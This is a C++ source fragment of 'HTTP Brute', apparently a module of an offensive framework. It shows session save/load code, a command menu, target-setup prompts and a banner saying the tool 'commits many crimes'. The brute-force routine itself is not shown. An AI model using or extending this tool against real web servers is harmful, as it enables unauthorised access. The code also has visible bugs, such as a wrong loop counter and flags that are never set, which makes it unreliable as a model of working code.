			fileData += "_hostName: " + _hostName + "\r\n";
			fileData += "_ipAddress: " + _ipAddress + "\r\n";
			
			// 3
			memset(tmp2, 0, 20);
			sprintf(tmp2, "%d", _portNumber);
			tmp = tmp2;
			fileData += "_portNumber: "+tmp+"\r\n";

			// 4
			fileData += "_method: "+_method+"\r\n";
			fileData += "_uri: "+_uri+"\r\n";
			fileData += "_httpVersion: "+_httpVersion+"\r\n";
			
			// 5
			memset(tmp2, 0, 20);
			sprintf(tmp2, "%d", _extraHeadersCount);
			tmp = tmp2;
			fileData += "_extraHeadersCount: "+tmp+"\r\n";
			
			// 6
			bool found = false;
			for(int i=0; i<10; i++){
				if(_extraHeaders[i] != ""){
					if(!found){
						fileData += "_extraHeaders: "+_extraHeaders[i]+"\t";
					}else{
						fileData += _extraHeaders[i]+"\t";
					}
				}
			}
			if(found)
				fileData += "\r\n";

			// 7
			memset(tmp2, 0, 20);
			sprintf(tmp2, "%d", _fetchedHeadersCount);
			tmp = tmp2;
			fileData += "_fetchedHeadersCount: "+tmp+"\r\n";

			// 8
			found = false;
			for(int i=0; i<10; i++){
				if(_fetchedHeaders[i][0] != ""){
					if(!found){
						fileData += "_fetchedHeaders: "+_fetchedHeaders[i][0]+"\0"+_fetchedHeaders[i][1]+"\0"+_fetchedHeaders[i][2]+"\t";
					}else{
						fileData += _fetchedHeaders[i][0]+"\0"+_fetchedHeaders[i][1]+"\0"+_fetchedHeaders[i][2]+"\t";
					}
				}
			}
			if(found)
				fileData += "\r\n";

			// 9
			if(_ignoreCookies){
				fileData += "_ignoreCookies: true\r\n";
			}else{
				fileData += "_ignoreCookies: false\r\n";
			}
			
			// 10
			if(_fetchCookiesOnce){
				fileData += "_fetchCookiesOnce: true\r\n";
			}else{
				fileData +=  "_fetchCookiesOnce: false\r\n";
			}

			// 11
			fileData += "_cookieFetchUri: "+_cookieFetchUri+"\r\n";
			fileData += "_cookies: "+_cookies+"\r\n";

			// 12
			memset(tmp2, 0, 20);
			sprintf(tmp2, "%ld", (long)_contentLength);
			tmp = tmp2;
			fileData += "_contentLength: "+tmp+"\r\n";
			if(_contentLength > 0 && _contentLength != -1 && !(_contentLength <= 0)){
				base64.setInputs(_content, _contentLength);
				base64.encode();
				tmp = base64.getResult();
				fileData += "_content: "+tmp+"\r\n";
			}
			
			//const int MAX_NET_BUFFER = 100000;
			//char _netBuffer[100000] = {0};
			//size_t _netBufferCount = 0;

			// 13
			memset(tmp2, 0, 20);
			sprintf(tmp2, "%d\t%d", _brutePos[0], _brutePos[1]);
			tmp = tmp2;
			fileData += "_brutePos: "+tmp+"\r\n";
			
			// 14
			found = false;
			for(int i=0; i<15; i++){
				if(_successStrings[i] != ""){
					if(!found){
						found = true;
						fileData += "_successStrings: "+_successStrings[i]+"\t";
					}else{
						fileData += _successStrings[i]+"\t";
					}
				}
			}
			if(found){
				fileData += "\r\n";
			}

			FileSnake filesnake;
			if(filesnake.writeFileTrunc(_sessionFile, (char *)fileData.c_str(),  fileData.length()))
				printf("[+] Session Saved to '%s'\n", _sessionFile.c_str());
			else{
				fprintf(stderr, "[E] Failed to save session to '%s'\n", _sessionFile.c_str());
			}
		}
		
		void _loadSessionFromFile(void){
			FileSnake filesnake;
			string targetFile = _sessionFile;
			if(filesnake.fileExists(_sessionFile)){
				printf("Would you like to use the pre-existing session file? (n/Y)\n(~)> ");
				string inpt = this->getUserInput();
				if(inpt == "n" && inpt == "N" && inpt == "no" && inpt == "No"){
					printf("Enter the file that you'd like to use instead.\n(~)> ");
					targetFile = this->getUserInput();
				}
			}else{
				printf("Enter the file that you'd like to use instead.\n(~)> ");
				targetFile = this->getUserInput();
			}

			if(!filesnake.fileExists(targetFile)){
				fprintf(stderr, "[E] file doesn't exist, aborting.\n");
				return;
			}
			size_t fileSize = filesnake.getFileSize(targetFile);
			if(fileSize <= 0){
				fprintf(stderr, "[E] target file is empty, aborting.\n");
				return;
			}

			char *seshBuffer = (char*)malloc(sizeof(char)*fileSize);
			filesnake.readFile(targetFile, seshBuffer, fileSize);
			string sesh = seshBuffer;
			string grabber = "";
			char valids[10] = {
				'0', '1', '2', '3', '4',
				'5', '6', '7', '8', '9'
			};
				
			grabber = fetchSessionFileLine("_maxBruteLength", sesh);
			if(grabber != ""){
				int multiplyer = 1;
				_maxBruteLength = 0;
				for(int i=grabber.length()-1; i>=strlen("_maxBruteLength: "); i--){
					for(int j=0; j<10; j++){
						if(grabber[i] == valids[j]){
							_maxBruteLength += j*multiplyer;
							multiplyer *= 10;
							break;
						}
					}
				}	
			}

			grabber = fetchSessionFileLine("_startingBruteLength: ", sesh);
			if(grabber != ""){
				int multiplyer = 1;
				_startingBruteLength = 0;
				for(int i=grabber.length()-1; i>=strlen("_startingBruteLength: "); i--){
					for(int j=0; j<10; j++){
						if(grabber[i] == valids[j]){
							_startingBruteLength += j*multiplyer;
							multiplyer *= 10;
							break;
						}
					}
				}	
				
			}
			grabber = fetchSessionFileLine("_hostName: ", sesh);
			if(grabber != ""){
				_hostName = "";
				for(int i=strlen("_hostName: "); i<grabber.length(); i++){
					_hostName += grabber[i];
				}		
			}
			grabber = fetchSessionFileLine("_ipAddress: ", sesh);
			if(grabber != ""){
				_ipAddress = "";
				for(int i=strlen("_ipAddress: "); i<grabber.length(); i++){
					_ipAddress += grabber[i];
				}	
				
			}
			grabber = fetchSessionFileLine("_portNumber: ", sesh);
			if(grabber != ""){
				int multiplyer = 1;
				_portNumber = 0;
				for(int i=grabber.length()-1; i>=strlen("_portNumber: "); i--){
					for(int j=0; j<10; j++){
						if(grabber[i] == valids[j]){
							_portNumber += j*multiplyer;
							multiplyer *= 10;
							break;
						}
					}
				}	
				
			}
			grabber = fetchSessionFileLine("_method: ", sesh);
			if(grabber != ""){
				_method = "";
				for(int i=strlen("_method: "); i<grabber.length(); i++){
					_method += grabber[i];
				}	
				
			}
			grabber = fetchSessionFileLine("_uri: ", sesh);
			if(grabber != ""){
				_uri = "";
				for(int i=strlen("_uri: "); i<grabber.length(); i++){
					_uri += grabber[i];
				}	
				
			}
			grabber = fetchSessionFileLine("_httpVersion: ", sesh);
			if(grabber != ""){
				_httpVersion = "";
				for(int i=strlen("_httpVersion: "); i<grabber.length(); i++){
					_httpVersion += grabber[i];
				}	
				
			}
			grabber = fetchSessionFileLine("_extraHeadersCount: ", sesh);
			if(grabber != ""){
				int multiplyer = 1;
				_extraHeadersCount = 0;
				for(int i=grabber.length()-1; i>=strlen("_extraHeadersCount: "); i--){
					for(int j=0; j<10; j++){
						if(grabber[i] == valids[j]){
							_extraHeadersCount += j*multiplyer;
							multiplyer *= 10;
							break;
						}
					}
				}	
				
			}
			grabber = fetchSessionFileLine("_extraHeaders: ", sesh);
			if(grabber != ""){
				string tmpGrabber = "";
				int track = 0;
				for(int i=strlen("_extraHeaders: "); i<grabber.length(); i++){
					if(grabber[i] == '\t' && track < HEADERS_MAX){
							_extraHeaders[track] = tmpGrabber;
							track++;
							tmpGrabber = "";
					}else{
						tmpGrabber += grabber[i];
					}
				}
				
			}
			grabber = fetchSessionFileLine("_fetchedHeadersCount: ", sesh);
			if(grabber != ""){
				int multiplyer = 1;
				_fetchedHeadersCount = 0;
				for(int i=grabber.length()-1; i>=strlen("_fetchedHeadersCount: "); i--){
					for(int j=0; j<10; j++){
						if(grabber[i] == valids[j]){
							_fetchedHeadersCount += j*multiplyer;
							multiplyer *= 10;
							break;
						}
					}
				}	
				
			}
			grabber = fetchSessionFileLine("_fetchedHeaders: ", sesh);
			if(grabber != ""){
				string tmpGrabber = "";
				int track = 0;
				int innerTrack = 0;
				for(int i=strlen("_fetchedHeaders: "); i<grabber.length(); i++){
					if(grabber[i] == '\t' && track < HEADERS_MAX){
						string magicGrabber = "";
						innerTrack = 0;
						for(int j=0; j<tmpGrabber.length(); i++){
							if(tmpGrabber[i] == '\0' && innerTrack < 3){
								_fetchedHeaders[track][innerTrack] = magicGrabber;
								innerTrack++;
								magicGrabber = "";
							}else{
								magicGrabber += tmpGrabber[i];
							}
							
						}
						track++;
						tmpGrabber = "";
					}else{
						tmpGrabber += grabber[i];
					}
				}
				
			}
			grabber = fetchSessionFileLine("_ignoreCookies: ", sesh);
			if(grabber != ""){
				string tmpGrabber = "";
				for(int i=strlen("_ignoreCookies: "); i<grabber.length(); i++){
					tmpGrabber += grabber[i];
				}
				if(tmpGrabber == "false")
					_ignoreCookies = false;
				else
					_ignoreCookies = true;
			}
			grabber = fetchSessionFileLine("_fetchCookiesOnce: ", sesh);
			if(grabber != ""){
				string tmpGrabber = "";
				for(int i=strlen("_fetchCookiesOnce: "); i<grabber.length(); i++){
					tmpGrabber += grabber[i];
				}
				if(tmpGrabber == "false")
					_fetchCookiesOnce = false;
				else
					_fetchCookiesOnce = true;
				
			}
			grabber = fetchSessionFileLine("_cookieFetchUri: ", sesh);
			if(grabber != ""){
				_cookieFetchUri = "";
				for(int i=strlen("_cookieFetchUri: "); i<grabber.length(); i++){
					_cookieFetchUri += grabber[i];
				}	
				
			}
			grabber = fetchSessionFileLine("_cookies: ", sesh);
			if(grabber != ""){
				_cookies = "";
				for(int i=strlen("_cookies: "); i<grabber.length(); i++){
					_cookies += grabber[i];
				}	
				
			}
			grabber = fetchSessionFileLine("_contentLength: ", sesh);
			if(grabber != ""){
				int multiplyer = 1;
				_contentLength = 0;
				for(int i=grabber.length()-1; i>=strlen("_contentLength: "); i--){
					for(int j=0; j<10; j++){
						if(grabber[i] == valids[j]){
							_contentLength += j*multiplyer;
							multiplyer *= 10;
							break;
						}
					}
				}	
			}
			grabber = fetchSessionFileLine("_content: ", sesh);
			if(grabber != ""){
				string tmpGrabber = "";
				for(int i=strlen("_content: "); i<grabber.length(); i++){
					tmpGrabber += grabber[i];
				}
				
				base64Class base64((char *)tmpGrabber.c_str(), tmpGrabber.length());
				base64.decode();
				tmpGrabber = base64.getResult();
				for(int i=0; i<CONTENT_MAX; i++){
					if(i >= base64.getResultSize())
						break;
					_content[i] = tmpGrabber[i];
				}
			}
			grabber = fetchSessionFileLine("_brutePos: ", sesh);
			if(grabber != ""){
				string tmpGrabber = "";
				int track = 0;
				for(int i=strlen("_brutePos: "); i<grabber.length(); i++){
					if(grabber[i] == '\t' && track < 2){
						int value = 0;
						int multiplyer = 1;
						for(int i=tmpGrabber.length()-1; i>=0; i--){
							for(int j=0; j<10; j++){
								if(tmpGrabber[i] == valids[j]){
									value += j*multiplyer;
									multiplyer *= 10;
									break;
								}
							}
						}
						_brutePos[track]=value;
						track++;
						tmpGrabber = "";
					}else{
						tmpGrabber += grabber[i];
					}
				}
				
			}
			grabber = fetchSessionFileLine("_successStrings: ", sesh);
			if(grabber != ""){
				string tmpGrabber = "";
				int track = 0;
				for(int i=strlen("_successStrings: "); i<grabber.length(); i++){
					if(grabber[i] == '\t' && track < 15){
							_successStrings[track] = tmpGrabber;
							track++;
							tmpGrabber = "";
					}else{
						tmpGrabber += grabber[i];
					}
				}
				
			}
		}

		string fetchSessionFileLine(string searchString, string fileBuffer){
			if(fileBuffer.find(searchString) == -1){
				return "";
			}

			size_t pos = fileBuffer.find(searchString);
			string grabber = "";
			for(int i=pos; i<fileBuffer.length(); i++){
				if(fileBuffer[i] == '\r' && !(i+1 >=fileBuffer.length()) && fileBuffer[i+1] == '\n'){
					break;
				}
				grabber += fileBuffer[i];
			}
			return grabber;
		}

		const int _commandCount = 18;
		string _commandList[18] = {
			"help",
			"exit",
			"show configs",
			"set host name",
			"set ip",
			"set port number", 
			"set wordlists",
			"set uri",
			"set padding",
			"set starting pattern",
			"set results file",
			"configure payload",
			"configure permuter",
			"attack brute force",
			"save session",
			"set session file",
			"load session",
			"delete auto session"
		};
	public:
	void welcomeBanner(void){
		printf("\n\n");
		printf("~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~\n");
		printf("  (^)<  HTTP Brute 0.0.1 (Alpha)                                                         \n");
		printf("~(>)                               This tool commits many crimes. MANY!     <(*)         \n"); 
		printf("	Type 'help' for a list of commands.                                  (<)~        \n");
		printf("~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~\n");
	}
	
	void help(void){
		printf("~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~\n");
		printf("Available Commands (%d available)\n", _commandCount);
		for(int i=0; i<_commandCount; i++){
			printf("%s\n", _commandList[i].c_str());
		}
		printf("~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~\n");
		printf("\n");
	}
	void exitHttpBrute(void){
		this->setRunning(false);
	}
	void showConfigs(void){
		printf("~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~\n");
		printf("\nWeapons Configuration:\n\tValid Chars : %s\n", 
				permuter._validChars.c_str());
		printf("\tWordlist Count : %d\n\tPadding : %s\n\tStarting Pattern : %s\n\tMax Brute Length : %d\n\tStarting Brute Length : %d\n", 
				_wordlistCount,
				_padding.c_str(), 
				permuter._startingPattern.c_str(), 
				_maxBruteLength, 
				_startingBruteLength);
			
		printf("\nPermuter Configuration:\n");
		_printPermuterValues();
		
		printf("\nPayload Configuration:\n");
		_printPayloadConfig();
		
		printf("\nLogging Configuration:\n");
		printf("\tResults File : %s\n", _resultsFile.c_str());
			printf("Target Info:\n\tIP : %s\n\tPort : %d\n\tHost Name : %s\n\tTarget Uri : %s\n", 
										   _ipAddress.c_str(), 
										   _portNumber, 
										   _hostName.c_str(),
										   _uri.c_str());
		printf("~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~\n");
	}
	void setHostName(void){
		printf("~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~\n");
		printf("Enter a new host name, the current is '%s'\n(~)> ", _hostName.c_str());
		_hostName = this->getUserInput();
		printf("[+] Host name changed!\n");
		printf("~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~\n");
	}
	void setIp(void){
		printf("~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~\n");
		printf("Enter a new IP Address, the current is '%s'\n(~)> ", _ipAddress.c_str());
                _ipAddress = this->getUserInput();
     		printf("[+] IP Address changed!\n");
		printf("~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~\n");
	}
	void setPortNumber(void){
		printf("~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~\n");
		printf("Enter a new port number, the current is '%d'\n(~)> ", _portNumber);
   		_portNumber = this->getUserInputInt();
                printf("[+] Port number changed!\n");
		printf("~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~\n");
	}
	void setWordlists(void){
		printf("~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~\n");
		printf("Available Wordlist Slots:\n");
		for(int i=0; i<WORDLIST_MAX; i++){
			printf("(%d) || %s\n", i, _wordlists[i].c_str());
		}
		printf("Which one would you like to set (enter a number)? \n(~)> ");
		int pos = this->getUserInputInt();

		if(pos < 0 || pos >= WORDLIST_MAX){
			fprintf(stderr, "[E] Buffer overflow\n");
			return;
		}
		string inpt = "";
		printf("Please provide a new value for wordlist %d\n(~)> ", pos);
		inpt = this->getUserInput();

		_wordlists[pos] = inpt;
		_wordlistCount = 0;
		for(int i=0; i<WORDLIST_MAX; i++){
			if(_wordlists[i] != "")
				_wordlistCount++;
		}
		printf("[+] Wordlist successfully added.\n");
		printf("~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~\n");
	}
	void setUri(void){
		printf("~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~\n");
		printf("Enter a new URI, the current is '%s'\n(~)> ", _uri.c_str());
                _uri = this->getUserInput();
		printf("[+] URI has changed!\n");
		printf("~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~ ~>~><~<~\n");
	}

	HttpBrute(string basePath) : Module("http-brute", "0.0.1", basePath){
		this->setRunning(true);
		string io = "";
		FileSnake fileSnake;
		while(this->isRunning()){
			switch(this->getContext()){
				case 0:
                                        io = this->promptUserInput("", "[http-brute](.)> ");
					if(io == "help"){
						help();
					}else if(io == "exit"){
						exitHttpBrute();
					}else if(io == "show configs"){
						showConfigs();
					}else if(io == "set host name"){
						setHostName();
					}else if(io == "set ip"){
						setIp();
					}else if(io == "set port number"){
						setPortNumber();
					}else if(io == "set wordlists"){
						setWordlists();
					}else if(io == "set uri"){
						setUri();
					}else if(io == "set padding"){
						_setPaddingCommand();	
					}else if(io == "set starting pattern"){
						_setStartingPatternCommand();	
					}else if(io == "set results file"){
						_setResultsFileCommand();
					}else if(io == "configure payload"){
						_configurePayloadCommand();
					}else if(io == "configure permuter"){
						_configurePermuter();
					}else if(io == "attack brute force"){
						_attackBruteForceCommand();
					}else if(io == "save session"){
						_saveSession();
					}else if(io == "set session file"){
						_setSessionFile();
					}else if(io == "load session"){
						_loadSessionFromFile();
					}else if(io == "delete auto session"){
						_deleteSessionFile();
					}else{
						printf("bad command...\n");
					}
					break;
				case -1:
	
					_resultsFile = this->getModuleBase();
					_resultsFile += "/results";
					_sessionFile = this->getModuleBase();
					_sessionFile += "/session";
					memset(_content, 0, CONTENT_MAX);
					permuter._validChars = "eariotnslcudpmhgbfywkvxzjq";
					permuter._startingPattern = "eeeeeeeeeeeeeeee";
					permuter._mapperSize = _maxBruteLength;	
					permuter.defaultMapper();
					_successStrings[0] = "HTTP/1.1 200";
					_successStrings[1] = "HTTP/1.1 301";

					welcomeBanner();
					this->setContext(0);
					break;
				default:
					fprintf(stderr, "[E] http-brute module is in a bad context\n");
					this->setRunning(false);
					break;
			}
		}
		printf("(^)< {Thanks for playing!}\n\n");
	}
};
